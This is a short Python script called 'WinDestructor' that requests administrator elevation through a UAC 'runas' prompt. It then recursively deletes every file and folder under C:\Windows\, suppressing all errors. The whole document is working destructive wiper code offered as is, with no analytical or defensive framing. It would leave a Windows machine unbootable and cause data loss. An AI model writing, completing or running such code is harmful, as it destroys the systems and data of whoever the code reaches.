import os
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

class WinDestructor:
    def __init__(self):
        self.sysRoot = 'C:\\'

    def delete_files_in_directory(self, directory_path):
        try:
            for root, dirs, files in os.walk(directory_path, topdown=False):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        # Handle the exception if needed
                        pass

                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    try:
                        os.rmdir(dir_path)
                    except Exception as e:
                        # Handle the exception if needed
                        pass
        except Exception as e:
            # Handle the exception if needed
            pass

if __name__ == "__main__":
    win_destructor_instance = WinDestructor()

    # Call the functions
    win_destructor_instance.delete_files_in_directory('C:\\Windows\\')

